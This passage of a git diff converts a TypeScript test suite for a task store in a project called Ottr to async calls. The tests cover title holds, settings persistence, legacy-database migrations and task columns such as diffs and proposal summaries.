+		expect(cancelled).toEqual([]);
+
+		const initialRelease = store.releaseTitleHold(task.id);
+		expect(initialRelease).toBeInstanceOf(Promise);
+		expect(await initialRelease).toBe(true);
+		expect(cancelled).toEqual(["initial"]);
+		expect(await store.releaseTitleHold(task.id)).toBe(false);
+		expect(await store.titleHold(task.id)).toBe(false);
+		expect(cancelled).toEqual(["initial"]);
+
+		const replacementHold = store.holdTitle(task.id, () => {
+			cancelled.push("replaced");
+		});
+		expect(replacementHold).toBeInstanceOf(Promise);
+		await replacementHold;
+		await store.holdTitle(task.id, () => {
+			cancelled.push("replacement");
+		});
+		expect(cancelled).toEqual(["initial", "replaced"]);
+		const held = store.titleHold(task.id);
+		expect(held).toBeInstanceOf(Promise);
+		expect(await held).toBe(true);
+		expect(await store.releaseTitleHold(task.id)).toBe(true);
+		expect(await store.releaseTitleHold(task.id)).toBe(false);
+		expect(await store.titleHold(task.id)).toBe(false);
+		expect(cancelled).toEqual(["initial", "replaced", "replacement"]);
+
+		const logPath = store.logPath(task.id);
+		const imagesDir = store.imagesDir(task.id);
+		expect(logPath).toBeInstanceOf(Promise);
+		expect(imagesDir).toBeInstanceOf(Promise);
+		expect(await logPath).toBe(join(store.tasksDir, "logs", `${task.id}.log`));
+		expect(await imagesDir).toBe(join(store.tasksDir, "images", task.id));
+		await expect(store.getTask(task.id)).rejects.toThrow("Store is closed");
 	});
 });
 
 describe("shortTitle", () => {
-	test("short lines pass through, long lines cut at a word boundary", () => {
+	test("short lines pass through, long lines cut at a word boundary", async () => {
 		expect(shortTitle("Fix the login bug")).toBe("Fix the login bug");
 		const long =
 			"Fix the login bug when the session cookie expires mid request";
@@ -591,21 +691,23 @@ describe("shortTitle", () => {
 });
 
 describe("settings", () => {
-	test("displayName and releaseCommand survive a reopen, reset to null, and leave the other settings alone", () => {
+	test("displayName and releaseCommand survive a reopen, reset to null, and leave the other settings alone", async () => {
 		const dir = join(root, "settings-name");
-		let store = open(dir);
-		expect(store.getSettings().displayName).toBeNull();
-		expect(store.getSettings().releaseCommand).toBeNull();
-		store.setSettings({ maxParallel: 3 });
-		store.setSettings({ displayName: "Ottr" });
-		store.setSettings({ releaseCommand: "node scripts/release.mjs --ottr" });
-		store.setSettings({
+		let store = await open(dir);
+		expect((await store.getSettings()).displayName).toBeNull();
+		expect((await store.getSettings()).releaseCommand).toBeNull();
+		await store.setSettings({ maxParallel: 3 });
+		await store.setSettings({ displayName: "Ottr" });
+		await store.setSettings({
+			releaseCommand: "node scripts/release.mjs --ottr",
+		});
+		await store.setSettings({
 			archReviewCap: 80,
 			maxImages: 4,
 		});
-		store.close();
-		store = open(dir);
-		expect(store.getSettings()).toEqual({
+		await store.close();
+		store = await open(dir);
+		expect(await store.getSettings()).toEqual({
 			maxParallel: 3,
 			copyExtra: [],
 			displayName: "Ottr",
@@ -639,8 +741,8 @@ describe("settings", () => {
 			pushSyncCommits: false,
 			taskIdPrefix: null,
 		});
-		store.setSettings({ displayName: null, releaseCommand: null });
-		expect(store.getSettings()).toEqual({
+		await store.setSettings({ displayName: null, releaseCommand: null });
+		expect(await store.getSettings()).toEqual({
 			maxParallel: 3,
 			copyExtra: [],
 			displayName: null,
@@ -674,171 +776,171 @@ describe("settings", () => {
 			pushSyncCommits: false,
 			taskIdPrefix: null,
 		});
-		store.close();
+		await store.close();
 	});
 
-	test("a settings blob from before forkMergeHold reads the default on", () => {
+	test("a settings blob from before forkMergeHold reads the default on", async () => {
 		const dir = join(root, "settings-pre-fork-merge-hold");
-		let store = open(dir);
+		let store = await open(dir);
 		// A project last written before the switch existed holds only the older keys:
 		// one row per key, none named forkMergeHold.
-		store.setSettings({ holdUpdateMerges: false });
-		store.close();
-		store = open(dir);
-		expect(store.getSettings().holdUpdateMerges).toBe(false);
-		expect(store.getSettings().forkMergeHold).toBe(true);
-		store.close();
+		await store.setSettings({ holdUpdateMerges: false });
+		await store.close();
+		store = await open(dir);
+		expect((await store.getSettings()).holdUpdateMerges).toBe(false);
+		expect((await store.getSettings()).forkMergeHold).toBe(true);
+		await store.close();
 	});
 
-	test("iconText persists across a reopen and resets to null", () => {
+	test("iconText persists across a reopen and resets to null", async () => {
 		const dir = join(root, "settings-icon-text");
-		let store = open(dir);
-		expect(store.getSettings().iconText).toBeNull();
-		store.setSettings({ iconText: "OT" });
-		store.close();
-		store = open(dir);
-		expect(store.getSettings().iconText).toBe("OT");
-		store.setSettings({ iconText: null });
-		expect(store.getSettings().iconText).toBeNull();
-		store.close();
+		let store = await open(dir);
+		expect((await store.getSettings()).iconText).toBeNull();
+		await store.setSettings({ iconText: "OT" });
+		await store.close();
+		store = await open(dir);
+		expect((await store.getSettings()).iconText).toBe("OT");
+		await store.setSettings({ iconText: null });
+		expect((await store.getSettings()).iconText).toBeNull();
+		await store.close();
 	});
 
-	test("numeric knobs keep the defaults when unset and persist overrides", () => {
+	test("numeric knobs keep the defaults when unset and persist overrides", async () => {
 		const dir = join(root, "settings-numbers");
-		const probe = open(dir);
-		expect(probe.getSettings()).toMatchObject({
+		const probe = await open(dir);
+		expect(await probe.getSettings()).toMatchObject({
 			archReviewCap: 150,
 			maxImages: 8,
 			keptWorktreeDays: 7,
 		});
-		probe.close();
-		const store = open(dir);
-		store.setSettings({ archReviewCap: 300 });
-		expect(store.getSettings().archReviewCap).toBe(300);
-		expect(store.getSettings().maxImages).toBe(8);
-		store.close();
+		await probe.close();
+		const store = await open(dir);
+		await store.setSettings({ archReviewCap: 300 });
+		expect((await store.getSettings()).archReviewCap).toBe(300);
+		expect((await store.getSettings()).maxImages).toBe(8);
+		await store.close();
 	});
 
-	test("originUrl persists across a reopen, resets to null, and a corrupt row keeps the default", () => {
+	test("originUrl persists across a reopen, resets to null, and a corrupt row keeps the default", async () => {
 		const dir = join(root, "settings-origin-url");
-		let store = open(dir);
-		expect(store.getSettings().originUrl).toBeNull();
-		store.setSettings({ originUrl: "/srv/git/proj.git" });
-		store.close();
-		store = open(dir);
-		expect(store.getSettings().originUrl).toBe("/srv/git/proj.git");
-		store.close();
+		let store = await open(dir);
+		expect((await store.getSettings()).originUrl).toBeNull();
+		await store.setSettings({ originUrl: "/srv/git/proj.git" });
+		await store.close();
+		store = await open(dir);
+		expect((await store.getSettings()).originUrl).toBe("/srv/git/proj.git");
+		await store.close();
 		// A wrong-shape row (a worker, an old bug) must not surface as a pin: parseSetting
 		// keeps the null default, which fails closed at the next push (OTTR-348).
 		const db = new Database(join(tasksDirFor(dir), "tasks.db"));
 		db.run("UPDATE settings SET value = '3' WHERE key = 'originUrl'");
 		db.close();
-		store = open(dir);
-		expect(store.getSettings().originUrl).toBeNull();
-		store.setSettings({ originUrl: null });
-		expect(store.getSettings().originUrl).toBeNull();
-		store.close();
+		store = await open(dir);
+		expect((await store.getSettings()).originUrl).toBeNull();
+		await store.setSettings({ originUrl: null });
+		expect((await store.getSettings()).originUrl).toBeNull();
+		await store.close();
 	});
 
-	test("targetBranch persists across a reopen and resets to null", () => {
+	test("targetBranch persists across a reopen and resets to null", async () => {
 		const dir = join(root, "settings-target-branch");
-		let store = open(dir);
-		expect(store.getSettings().targetBranch).toBeNull();
-		store.setSettings({ targetBranch: "develop" });
-		store.close();
-		store = open(dir);
-		expect(store.getSettings().targetBranch).toBe("develop");
-		store.setSettings({ targetBranch: null });
-		expect(store.getSettings().targetBranch).toBeNull();
-		store.close();
+		let store = await open(dir);
+		expect((await store.getSettings()).targetBranch).toBeNull();
+		await store.setSettings({ targetBranch: "develop" });
+		await store.close();
+		store = await open(dir);
+		expect((await store.getSettings()).targetBranch).toBe("develop");
+		await store.setSettings({ targetBranch: null });
+		expect((await store.getSettings()).targetBranch).toBeNull();
+		await store.close();
 	});
 
-	test("keptWorktreeDays defaults to 7 and survives setSettings plus a reopen", () => {
+	test("keptWorktreeDays defaults to 7 and survives setSettings plus a reopen", async () => {
 		const dir = join(root, "settings-kept-days");
-		let store = open(dir);
-		expect(store.getSettings().keptWorktreeDays).toBe(7);
-		store.setSettings({ keptWorktreeDays: 3 });
-		store.close();
-		store = open(dir);
-		expect(store.getSettings().keptWorktreeDays).toBe(3);
-		store.close();
+		let store = await open(dir);
+		expect((await store.getSettings()).keptWorktreeDays).toBe(7);
+		await store.setSettings({ keptWorktreeDays: 3 });
+		await store.close();
+		store = await open(dir);
+		expect((await store.getSettings()).keptWorktreeDays).toBe(3);
+		await store.close();
 	});
 
-	test("retro settings default off+filtered, persist across reopen, and reset to null", () => {
+	test("retro settings default off+filtered, persist across reopen, and reset to null", async () => {
 		const dir = join(root, "settings-retro");
-		let store = open(dir);
-		expect(store.getSettings().retroSince).toBeNull();
-		expect(store.getSettings().retroFilter).toBe(true);
+		let store = await open(dir);
+		expect((await store.getSettings()).retroSince).toBeNull();
+		expect((await store.getSettings()).retroFilter).toBe(true);
 		const since = 1_700_000_000_000;
-		store.setSettings({ retroSince: since, retroFilter: false });
-		store.close();
-		store = open(dir);
+		await store.setSettings({ retroSince: since, retroFilter: false });
+		await store.close();
+		store = await open(dir);
 		// retroSince is an epoch number, so the settings key-value read path keeps it
 		// exactly; no column or migration involved.
-		expect(store.getSettings().retroSince).toBe(since);
-		expect(store.getSettings().retroFilter).toBe(false);
+		expect((await store.getSettings()).retroSince).toBe(since);
+		expect((await store.getSettings()).retroFilter).toBe(false);
 		// Off again: the row resets to null instead of being deleted.
-		store.setSettings({ retroSince: null });
-		expect(store.getSettings().retroSince).toBeNull();
-		store.close();
+		await store.setSettings({ retroSince: null });
+		expect((await store.getSettings()).retroSince).toBeNull();
+		await store.close();
 	});
 
-	test("runningPids lists only pids of turns that never ended", () => {
-		const store = open(join(root, "running-pids"));
-		const t = store.createTask("w");
-		const live = store.startTurn(t.id, "work", "p", 4242);
-		const ended = store.startTurn(t.id, "work", "p", 5151);
-		const noPid = store.startTurn(t.id, "work", "p", null);
-		store.finishTurn(ended.id, { endedAt: Date.now(), exitCode: 0 });
-		expect(store.runningPids()).toEqual([4242]);
-		store.finishTurn(live.id, { endedAt: Date.now(), exitCode: 0 });
-		expect(store.runningPids()).toEqual([]);
-		store.finishTurn(noPid.id, { exitCode: 0 });
-		store.close();
+	test("runningPids lists only pids of turns that never ended", async () => {
+		const store = await open(join(root, "running-pids"));
+		const t = await store.createTask("w");
+		const live = await store.startTurn(t.id, "work", "p", 4242);
+		const ended = await store.startTurn(t.id, "work", "p", 5151);
+		const noPid = await store.startTurn(t.id, "work", "p", null);
+		await store.finishTurn(ended.id, { endedAt: Date.now(), exitCode: 0 });
+		expect(await store.runningPids()).toEqual([4242]);
+		await store.finishTurn(live.id, { endedAt: Date.now(), exitCode: 0 });
+		expect(await store.runningPids()).toEqual([]);
+		await store.finishTurn(noPid.id, { exitCode: 0 });
+		await store.close();
 	});
 
-	test("auto-tend settings keep the defaults, persist across reopen, and fall back on a corrupt row", () => {
+	test("auto-tend settings keep the defaults, persist across reopen, and fall back on a corrupt row", async () => {
 		const dir = join(root, "settings-auto-tend");
-		const probe = open(dir);
-		expect(probe.getSettings()).toMatchObject({
+		const probe = await open(dir);
+		expect(await probe.getSettings()).toMatchObject({
 			autoTend: false,
 			autoTendLimit: 12,
 			tendChurnGlobs: [],
 		});
-		probe.setSettings({
+		await probe.setSettings({
 			autoTend: true,
 			autoTendLimit: 5,
 			tendChurnGlobs: ["**/*.import"],
 		});
-		probe.close();
+		await probe.close();
 		// Corrupt the tendChurnGlobs row directly: parse failure must keep the default.
 		const raw = new Database(join(dir, ".tasks", "tasks.db"));
 		raw.run("UPDATE settings SET value = '{oops' WHERE key = 'tendChurnGlobs'");
 		raw.close();
-		const store = open(dir);
-		expect(store.getSettings()).toMatchObject({
+		const store = await open(dir);
+		expect(await store.getSettings()).toMatchObject({
 			autoTend: true,
 			autoTendLimit: 5,
 			tendChurnGlobs: [],
 		});
-		store.close();
+		await store.close();
 	});
 
-	test("settings arrays belong to the caller, never to the shared defaults", () => {
-		const store = open(join(root, "settings-own-arrays"));
-		const first = store.getSettings();
+	test("settings arrays belong to the caller, never to the shared defaults", async () => {
+		const store = await open(join(root, "settings-own-arrays"));
+		const first = await store.getSettings();
 		first.tendChurnGlobs.push("**/*.import");
 		first.copyExtra.push(".env");
-		expect(store.getSettings()).toMatchObject({
+		expect(await store.getSettings()).toMatchObject({
 			tendChurnGlobs: [],
 			copyExtra: [],
 		});
-		store.close();
+		await store.close();
 	});
 });
 
 describe("release columns", () => {
-	test("open backfills release_version and release_notes on a pre-existing database and they round-trip", () => {
+	test("open backfills release_version and release_notes on a pre-existing database and they round-trip", async () => {
 		const dir = join(root, "legacy-release");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
@@ -847,76 +949,81 @@ describe("release columns", () => {
 			"CREATE TABLE tasks (id TEXT PRIMARY KEY, title TEXT, prompt TEXT, stage TEXT NOT NULL, state TEXT NOT NULL, needs_reason TEXT, pending_prompt TEXT, branch TEXT, base TEXT, worktree TEXT, session_id TEXT, summary TEXT, details TEXT, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL, queued_at INTEGER, cancelled_at INTEGER, images TEXT NOT NULL DEFAULT '[]', pending_images TEXT NOT NULL DEFAULT '[]')",
 		);
 		db.close();
-		const store = open(dir);
-		const task = store.createTask("release me");
+		const store = await open(dir);
+		const task = await store.createTask("release me");
 		expect(task.releaseVersion).toBeNull();
 		expect(task.releaseNotes).toBeNull();
-		store.updateTask(task.id, {
+		await store.updateTask(task.id, {
 			base: "abc1234",
 			releaseVersion: "v0.4.0",
 			releaseNotes: "## New features\n- Add the thing.",
 		});
-		const round = store.getTask(task.id);
+		const round = await store.getTask(task.id);
 		expect(round?.base).toBe("abc1234");
 		expect(round?.releaseVersion).toBe("v0.4.0");
 		expect(round?.releaseNotes).toBe("## New features\n- Add the thing.");
-		store.close();
+		await store.close();
 	});
 });
 
 describe("done_at", () => {
-	test("entering done stamps done_at; other patches never stamp", () => {
-		const store = open(join(root, "done-clock"));
-		const task = store.createTask("land me");
+	test("entering done stamps done_at; other patches never stamp", async () => {
+		const store = await open(join(root, "done-clock"));
+		const task = await store.createTask("land me");
 		expect(task.doneAt).toBeNull();
-		store.updateTask(task.id, { title: "rename only" });
-		expect(store.getTask(task.id)?.doneAt).toBeNull();
-		store.updateTask(task.id, { stage: "done", state: "idle" });
-		expect(store.getTask(task.id)?.doneAt).toBeGreaterThan(0);
-		store.close();
+		await store.updateTask(task.id, { title: "rename only" });
+		expect((await store.getTask(task.id))?.doneAt).toBeNull();
+		await store.updateTask(task.id, { stage: "done", state: "idle" });
+		expect((await store.getTask(task.id))?.doneAt).toBeGreaterThan(0);
+		await store.close();
 	});
 
-	test("re-entering done overwrites the stamp, like a release card that bounced and re-landed", () => {
-		const store = open(join(root, "done-reland"));
-		const task = store.createTask("bounce");
-		store.updateTask(task.id, { stage: "done", state: "idle" });
-		const first = store.getTask(task.id)?.doneAt ?? 0;
+	test("re-entering done overwrites the stamp, like a release card that bounced and re-landed", async () => {
+		const store = await open(join(root, "done-reland"));
+		const task = await store.createTask("bounce");
+		await store.updateTask(task.id, { stage: "done", state: "idle" });
+		const first = (await store.getTask(task.id))?.doneAt ?? 0;
 		while (Date.now() <= first) {} // a later landing must carry a later stamp
-		store.updateTask(task.id, { stage: "in_progress", state: "needs_you" });
-		store.updateTask(task.id, { stage: "done", state: "idle" });
-		expect(store.getTask(task.id)?.doneAt).toBeGreaterThan(first);
-		store.close();
+		await store.updateTask(task.id, {
+			stage: "in_progress",
+			state: "needs_you",
+		});
+		await store.updateTask(task.id, { stage: "done", state: "idle" });
+		expect((await store.getTask(task.id))?.doneAt).toBeGreaterThan(first);
+		await store.close();
 	});
 
-	test("open migrates a pre-update conflict park reason to the reply-recovery text", () => {
+	test("open migrates a pre-update conflict park reason to the reply-recovery text", async () => {
 		const dir = join(root, "conflict-reason-migration");
-		const store = open(dir);
-		const t = store.createTask("conflicted");
+		const store = await open(dir);
+		const t = await store.createTask("conflicted");
 		// The park exactly as the shipped OTTR-789 code wrote it.
-		store.updateTask(t.id, {
+		await store.updateTask(t.id, {
 			stage: "merging",
 			state: "needs_you",
 			needsReason:
 				"PR #7 cannot merge: it conflicts with the target branch. Resolve the conflict on the pull request.",
 		});
 		// A human-written reason must survive untouched.
-		const other = store.createTask("not a conflict park");
-		store.updateTask(other.id, {
+		const other = await store.createTask("not a conflict park");
+		await store.updateTask(other.id, {
 			needsReason: "Resolve the conflict on the pull request.",
 		});
-		store.close();
-		const reopened = open(dir);
-		expect(reopened.getTask(t.id)?.needsReason).toBe(prConflictReason(7));
-		expect(reopened.getTask(other.id)?.needsReason).toBe(
+		await store.close();
+		const reopened = await open(dir);
+		expect((await reopened.getTask(t.id))?.needsReason).toBe(
+			prConflictReason(7),
+		);
+		expect((await reopened.getTask(other.id))?.needsReason).toBe(
 			"Resolve the conflict on the pull request.",
 		);
 		// Idempotent: the migrated text no longer matches the migration.
-		reopened.close();
-		const again = open(dir);
-		expect(again.getTask(t.id)?.needsReason).toBe(prConflictReason(7));
+		await reopened.close();
+		const again = await open(dir);
+		expect((await again.getTask(t.id))?.needsReason).toBe(prConflictReason(7));
 	});
 
-	test("open backfills done_at from the last turn's end on a pre-existing database", () => {
+	test("open backfills done_at from the last turn's end on a pre-existing database", async () => {
 		const dir = join(root, "legacy-done");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
@@ -941,12 +1048,12 @@ describe("done_at", () => {
 			[landedAt - 30000, landedAt],
 		);
 		db.close();
-		const store = open(dir);
-		expect(store.getTask("done1")?.doneAt).toBe(landedAt);
-		store.close();
+		const store = await open(dir);
+		expect((await store.getTask("done1"))?.doneAt).toBe(landedAt);
+		await store.close();
 	});
 
-	test("open backfills done_at when a prior migration added the column but stopped before the backfill", () => {
+	test("open backfills done_at when a prior migration added the column but stopped before the backfill", async () => {
 		const dir = join(root, "interrupted-done-backfill");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
@@ -972,26 +1079,26 @@ describe("done_at", () => {
 			[landedAt - 30000, landedAt],
 		);
 		db.close();
-		const store = open(dir);
-		expect(store.getTask("done1")?.doneAt).toBe(landedAt);
-		store.close();
+		const store = await open(dir);
+		expect((await store.getTask("done1"))?.doneAt).toBe(landedAt);
+		await store.close();
 	});
 });
 
 describe("task model", () => {
-	test("createTask stores the model and getTask/listTasks return it", () => {
-		const store = open(join(root, "task-model"));
-		const task = store.createTask("do things", "openai/gpt-5.2");
+	test("createTask stores the model and getTask/listTasks return it", async () => {
+		const store = await open(join(root, "task-model"));
+		const task = await store.createTask("do things", "openai/gpt-5.2");
 		expect(task.model).toBe("openai/gpt-5.2");
-		expect(store.getTask(task.id)?.model).toBe("openai/gpt-5.2");
-		expect(store.listTasks().find((t) => t.id === task.id)?.model).toBe(
+		expect((await store.getTask(task.id))?.model).toBe("openai/gpt-5.2");
+		expect((await store.listTasks()).find((t) => t.id === task.id)?.model).toBe(
 			"openai/gpt-5.2",
 		);
-		expect(store.createTask("x").model).toBeNull();
-		store.close();
+		expect((await store.createTask("x")).model).toBeNull();
+		await store.close();
 	});
 
-	test("open backfills tasks.model on a pre-existing database without it", () => {
+	test("open backfills tasks.model on a pre-existing database without it", async () => {
 		const dir = join(root, "legacy-task-model");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
@@ -1000,65 +1107,65 @@ describe("task model", () => {
 			"CREATE TABLE tasks (id TEXT PRIMARY KEY, title TEXT, prompt TEXT, stage TEXT NOT NULL, state TEXT NOT NULL, needs_reason TEXT, pending_prompt TEXT, branch TEXT, base TEXT, worktree TEXT, session_id TEXT, summary TEXT, details TEXT, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL, queued_at INTEGER, cancelled_at INTEGER, images TEXT NOT NULL DEFAULT '[]', pending_images TEXT NOT NULL DEFAULT '[]', release_version TEXT, release_notes TEXT, session_title TEXT, asked TEXT)",
 		);
 		db.close();
-		const store = open(dir);
-		const task = store.createTask("modeled", "openai/gpt-5");
-		expect(store.getTask(task.id)?.model).toBe("openai/gpt-5");
-		store.close();
+		const store = await open(dir);
+		const task = await store.createTask("modeled", "openai/gpt-5");
+		expect((await store.getTask(task.id))?.model).toBe("openai/gpt-5");
+		await store.close();
 	});
 });
 
 describe("diff capture columns", () => {
-	test("stores stat and text, survives a reopen, defaults null", () => {
-		const store = open(join(root, "diff-capture"));
-		const task = store.createTask("captured");
+	test("stores stat and text, survives a reopen, defaults null", async () => {
+		const store = await open(join(root, "diff-capture"));
+		const task = await store.createTask("captured");
 		expect(task.diffFiles).toBeNull();
 		expect(task.diffText).toBeNull();
-		store.updateTask(task.id, {
+		await store.updateTask(task.id, {
 			diffFiles: [
 				{ file: "src/app.ts", plus: 12, minus: 3 },
 				{ file: "logo.png", plus: null, minus: null },
 			],
 			diffText: "diff --git a/src/app.ts b/src/app.ts\n…",
 		});
-		const stored = store.getTask(task.id);
+		const stored = await store.getTask(task.id);
 		expect(stored?.diffFiles).toEqual([
 			{ file: "src/app.ts", plus: 12, minus: 3 },
 			{ file: "logo.png", plus: null, minus: null },
 		]);
 		expect(stored?.diffText).toContain("diff --git");
-		store.close();
-		const reopened = open(join(root, "diff-capture"));
-		expect(reopened.getTask(task.id)?.diffFiles?.length).toBe(2);
-		reopened.close();
+		await store.close();
+		const reopened = await open(join(root, "diff-capture"));
+		expect((await reopened.getTask(task.id))?.diffFiles?.length).toBe(2);
+		await reopened.close();
 	});
 
-	test("listTasks leaves out the raw diff and matches getTask on every other field", () => {
-		const store = open(join(root, "diff-list"));
-		const task = store.createTask("listed");
-		store.updateTask(task.id, {
+	test("listTasks leaves out the raw diff and matches getTask on every other field", async () => {
+		const store = await open(join(root, "diff-list"));
+		const task = await store.createTask("listed");
+		await store.updateTask(task.id, {
 			diffFiles: [{ file: "a.ts", plus: 1, minus: 0 }],
 			diffText: "diff --git a/a.ts b/a.ts\n",
 			details: "the details",
 			report: "the report",
 		});
-		const [listed] = store.listTasks();
-		const { diffText, ...rest } = store.getTask(task.id)!;
+		const [listed] = await store.listTasks();
+		const { diffText, ...rest } = (await store.getTask(task.id))!;
 		expect(diffText).toBe("diff --git a/a.ts b/a.ts\n");
 		expect(listed).not.toHaveProperty("diffText");
 		// Strict: a column missing from the list read would show as undefined, not null.
 		expect(listed).toStrictEqual(rest);
-		store.close();
+		await store.close();
 	});
 
-	test("a corrupt stored stat list reads as null, not a partial list", () => {
-		const store = open(join(root, "diff-corrupt"));
-		const task = store.createTask("corrupt");
-		store.updateTask(task.id, { diffFiles: [{ file: 5 }] as never });
-		expect(store.getTask(task.id)?.diffFiles).toBeNull();
-		store.close();
+	test("a corrupt stored stat list reads as null, not a partial list", async () => {
+		const store = await open(join(root, "diff-corrupt"));
+		const task = await store.createTask("corrupt");
+		await store.updateTask(task.id, { diffFiles: [{ file: 5 }] as never });
+		expect((await store.getTask(task.id))?.diffFiles).toBeNull();
+		await store.close();
 	});
 
-	test("a legacy database without the columns converges on open", () => {
+	test("a legacy database without the columns converges on open", async () => {
 		const dir = join(root, "diff-legacy");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
@@ -1070,20 +1177,20 @@ describe("diff capture columns", () => {
 			"INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at) VALUES ('abc12345', 'old', 'p', 'done', 'idle', 1, 1)",
 		);
 		db.close();
-		const store = open(dir);
-		const task = store.getTask("abc12345");
+		const store = await open(dir);
+		const task = await store.getTask("abc12345");
 		expect(task?.diffFiles).toBeNull();
 		expect(task?.diffText).toBeNull();
-		store.close();
+		await store.close();
 	});
 });
 
 describe("proposal summary column", () => {
-	test("stores the five fields and survives a reopen; fresh rows default null", () => {
-		const store = open(join(root, "proposal-summary"));
-		const task = store.createTask("held proposal");
+	test("stores the five fields and survives a reopen; fresh rows default null", async () => {
+		const store = await open(join(root, "proposal-summary"));
+		const task = await store.createTask("held proposal");
 		expect(task.proposalSummary).toBeNull();
-		store.updateTask(task.id, {
+		await store.updateTask(task.id, {
 			proposalSummary: {
 				whatChanges: "Add a benchmark script for the merge path.",
 				why: "Merge turns re-run the same slow path on every retro.",
@@ -1092,7 +1199,7 @@ describe("proposal summary column", () => {
 				check: "bun test src/merge-bench.test.ts passes.",
 			},
 		});
-		const stored = store.getTask(task.id);
+		const stored = await store.getTask(task.id);
 		expect(stored?.proposalSummary).toEqual({
 			whatChanges: "Add a benchmark script for the merge path.",
 			why: "Merge turns re-run the same slow path on every retro.",
@@ -1100,27 +1207,27 @@ describe("proposal summary column", () => {
 			risk: "none found",
 			check: "bun test src/merge-bench.test.ts passes.",
 		});
-		store.close();
-		const reopened = open(join(root, "proposal-summary"));
-		expect(reopened.getTask(task.id)?.proposalSummary?.gain).toBe(
+		await store.close();
+		const reopened = await open(join(root, "proposal-summary"));
+		expect((await reopened.getTask(task.id))?.proposalSummary?.gain).toBe(
 			"About 30 seconds per retro run.",
 		);
-		reopened.close();
+		await reopened.close();
 	});
 
-	test("invalid or wrong-shaped proposal_summary JSON reads as null", () => {
-		const store = open(join(root, "proposal-summary-corrupt"));
-		const task = store.createTask("corrupt summary");
+	test("invalid or wrong-shaped proposal_summary JSON reads as null", async () => {
+		const store = await open(join(root, "proposal-summary-corrupt"));
+		const task = await store.createTask("corrupt summary");
 		// Not JSON.
-		store.updateTask(task.id, { proposalSummary: "not json" as never });
-		expect(store.getTask(task.id)?.proposalSummary).toBeNull();
+		await store.updateTask(task.id, { proposalSummary: "not json" as never });
+		expect((await store.getTask(task.id))?.proposalSummary).toBeNull();
 		// JSON but a wrong shape: a missing field drops the whole summary.
-		store.updateTask(task.id, {
+		await store.updateTask(task.id, {
 			proposalSummary: { whatChanges: "x", why: "y", gain: "z" } as never,
 		});
-		expect(store.getTask(task.id)?.proposalSummary).toBeNull();
+		expect((await store.getTask(task.id))?.proposalSummary).toBeNull();
 		// An empty string field also drops the whole summary.
-		store.updateTask(task.id, {
+		await store.updateTask(task.id, {
 			proposalSummary: {
 				whatChanges: "x",
 				why: "y",
@@ -1129,11 +1236,11 @@ describe("proposal summary column", () => {
 				check: "c",
 			} as never,
 		});
-		expect(store.getTask(task.id)?.proposalSummary).toBeNull();
-		store.close();
+		expect((await store.getTask(task.id))?.proposalSummary).toBeNull();
+		await store.close();
 	});
 
-	test("a legacy database without the column converges on open and reads null", () => {
+	test("a legacy database without the column converges on open and reads null", async () => {
 		const dir = join(root, "proposal-summary-legacy");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
@@ -1145,22 +1252,22 @@ describe("proposal summary column", () => {
 			"INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at) VALUES ('abc12345', 'old', 'p', 'done', 'idle', 1, 1)",
 		);
 		db.close();
-		const store = open(dir);
-		const task = store.getTask("abc12345");
+		const store = await open(dir);
+		const task = await store.getTask("abc12345");
 		expect(task?.proposalSummary).toBeNull();
-		store.close();
+		await store.close();
 	});
 });
 
 describe("speaker attribution", () => {
-	test("pendingBy and turn inputBy persist across a reopen; legacy rows read as null", () => {
+	test("pendingBy and turn inputBy persist across a reopen; legacy rows read as null", async () => {
 		const dir = join(root, "pending-by");
-		const store = open(dir);
-		const task = store.createTask("hold me");
+		const store = await open(dir);
+		const task = await store.createTask("hold me");
 		expect(task.pendingBy).toBe(null);
-		store.updateTask(task.id, { pendingBy: "supervisor" });
-		expect(store.getTask(task.id)!.pendingBy).toBe("supervisor");
-		const turn = store.startTurn(
+		await store.updateTask(task.id, { pendingBy: "supervisor" });
+		expect((await store.getTask(task.id))!.pendingBy).toBe("supervisor");
+		const turn = await store.startTurn(
 			task.id,
 			"work",
 			"p",
@@ -1170,86 +1277,92 @@ describe("speaker attribution", () => {
 			"supervisor",
 		);
 		expect(turn.inputBy).toBe("supervisor");
-		store.updateTask(task.id, { pendingBy: null });
-		store.close();
-		const reopened = open(dir);
-		expect(reopened.getTask(task.id)!.pendingBy).toBe(null);
-		expect(reopened.listTurns(task.id)[0]!.inputBy).toBe("supervisor");
-		reopened.close();
+		await store.updateTask(task.id, { pendingBy: null });
+		await store.close();
+		const reopened = await open(dir);
+		expect((await reopened.getTask(task.id))!.pendingBy).toBe(null);
+		expect((await reopened.listTurns(task.id))[0]!.inputBy).toBe("supervisor");
+		await reopened.close();
 	});
 });
 
 describe("keptFiles", () => {
-	test("updateTask stores and clears the list; fresh stores default to empty", () => {
-		const store = open(join(root, "kept"));
-		const task = store.createTask("keep me");
+	test("updateTask stores and clears the list; fresh stores default to empty", async () => {
+		const store = await open(join(root, "kept"));
+		const task = await store.createTask("keep me");
 		expect(task.keptFiles).toEqual([]);
-		const withFiles = store.updateTask(task.id, {
+		const withFiles = await store.updateTask(task.id, {
 			keptFiles: ["out/report.md", "data.log"],
 		});
 		expect(withFiles.keptFiles).toEqual(["out/report.md", "data.log"]);
-		expect(store.getTask(task.id)?.keptFiles).toEqual([
+		expect((await store.getTask(task.id))?.keptFiles).toEqual([
 			"out/report.md",
 			"data.log",
 		]);
-		expect(store.updateTask(task.id, { keptFiles: [] }).keptFiles).toEqual([]);
-		store.close();
+		expect(
+			(await store.updateTask(task.id, { keptFiles: [] })).keptFiles,
+		).toEqual([]);
+		await store.close();
 	});
 
-	test("updateTask stores followUpOf and it survives a reopen", () => {
-		const store = open(join(root, "follow-up-link"));
-		const parent = store.createTask("parent");
+	test("updateTask stores followUpOf and it survives a reopen", async () => {
